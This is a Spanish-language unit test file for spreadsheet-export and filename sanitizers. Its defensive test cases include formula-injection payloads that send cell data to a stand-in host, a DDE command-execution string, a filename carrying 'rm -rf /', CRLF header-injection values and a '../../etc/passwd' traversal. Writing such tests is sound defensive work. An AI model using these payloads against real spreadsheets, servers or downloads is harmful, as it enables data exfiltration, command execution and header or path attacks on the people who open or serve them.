import { describe, it, expect } from "vitest";
import { sanearTextoDePlanilla, sanearNombreDeArchivo } from "./planilla.ts";

describe("sanearTextoDePlanilla", () => {
  /**
   * Los payloads reales, no inventados: son las cuatro familias que un atacante usa contra una
   * planilla. Si alguna vuelve sin la marca de texto, el contador abre el archivo y Excel la evalúa.
   */
  it.each([
    ["=1+1", "fórmula aritmética simple"],
    ["=HYPERLINK(\"http://malo.test\"&A1,\"click\")", "exfiltración por hipervínculo"],
    ["=WEBSERVICE(\"http://malo.test/\"&A1)", "exfiltración por request saliente"],
    ["@SUM(A1)", "arroba, la inicial que más se olvida"],
    ["+cmd|'/c calc'!A1", "DDE: ejecución de comando"],
    ["-2+3", "menos como apertura de fórmula"],
    ["\t=1+1", "TAB que corre el punto de partida"],
    ["\r=1+1", "CR que corre el punto de partida"],
  ])("neutraliza %j (%s)", (payload) => {
    const salida = sanearTextoDePlanilla(payload);
    expect(salida.startsWith("'")).toBe(true);
    // El contenido se conserva entero: esto marca, no censura.
    expect(salida.slice(1)).toBe(payload);
  });

  /**
   * La otra mitad del contrato, y la que evita que alguien "simplifique" la función a un
   * `replace` global: el texto normal tiene que salir **idéntico**. Un motivo de anulación que
   * llega alterado a un reclamo es un problema distinto y peor.
   */
  it.each([
    "Error de carga del operador",
    "Pago duplicado — se anula el segundo",
    "Transferencia rechazada por el banco",
    "1+1 no es una fórmula si no empieza con signo",
    "Depósito $12.500 (ver comprobante)",
    "Mantenimiento de ascensores — Ñandú S.R.L.",
  ])("deja intacto %j", (texto) => {
    expect(sanearTextoDePlanilla(texto)).toBe(texto);
  });

  it("ausencia de texto es celda vacía, nunca la palabra null", () => {
    expect(sanearTextoDePlanilla(null)).toBe("");
    expect(sanearTextoDePlanilla(undefined)).toBe("");
    expect(sanearTextoDePlanilla("")).toBe("");
  });

  /**
   * Un carácter peligroso **en el medio** no abre nada: si esto se neutralizara, media planilla
   * saldría marcada por texto perfectamente legítimo y la marca dejaría de significar algo.
   */
  it("no toca un carácter peligroso que no está al principio", () => {
    expect(sanearTextoDePlanilla("Ajuste = corrección")).toBe("Ajuste = corrección");
    expect(sanearTextoDePlanilla("cuenta@barrio.test")).toBe("cuenta@barrio.test");
    expect(sanearTextoDePlanilla("Expensas 2026-08")).toBe("Expensas 2026-08");
  });

  it("es idempotente: sanear dos veces no acumula marcas", () => {
    const unaVez = sanearTextoDePlanilla("=1+1");
    expect(sanearTextoDePlanilla(unaVez)).toBe(unaVez);
  });
});

describe("sanearNombreDeArchivo", () => {
  /**
   * Inyección de cabecera, no cosmética: la razón social entra en `Content-Disposition` y la
   * escribe un `admin_barrio`. Un `"` cierra el `filename="…"`; un CR/LF abre una cabecera nueva.
   */
  it.each([
    ['Barrio"; rm -rf /', "comilla que cierra el filename"],
    ["Barrio\r\nX-Inyectada: si", "CRLF que abre una cabecera nueva"],
    ["Barrio\nSet-Cookie: a=b", "LF suelto"],
    ["../../etc/passwd", "recorrido de directorios"],
    ["Barrio; charset=utf-8", "punto y coma que abre un parámetro"],
  ])("neutraliza %j (%s)", (payload) => {
    const salida = sanearNombreDeArchivo(payload);
    expect(salida).not.toMatch(/["\r\n;/\\]/);
  });

  it("conserva los acentos y la ñ: un barrio no se baja con el nombre roto", () => {
    expect(sanearNombreDeArchivo("Los Álamos")).toBe("Los Álamos");
    expect(sanearNombreDeArchivo("Cañuelas Norte")).toBe("Cañuelas Norte");
  });

  it("conserva lo que un nombre de archivo necesita", () => {
    expect(sanearNombreDeArchivo("movimientos_2026-08.xlsx")).toBe("movimientos_2026-08.xlsx");
  });

  it("nunca devuelve vacío: un filename vacío rompe la descarga entera", () => {
    expect(sanearNombreDeArchivo("")).toBe("exportacion");
    expect(sanearNombreDeArchivo("///")).toBe("exportacion");
  });

  it("recorta largo sin dejar de ser un nombre", () => {
    const salida = sanearNombreDeArchivo("a".repeat(400));
    expect(salida.length).toBe(120);
  });
});
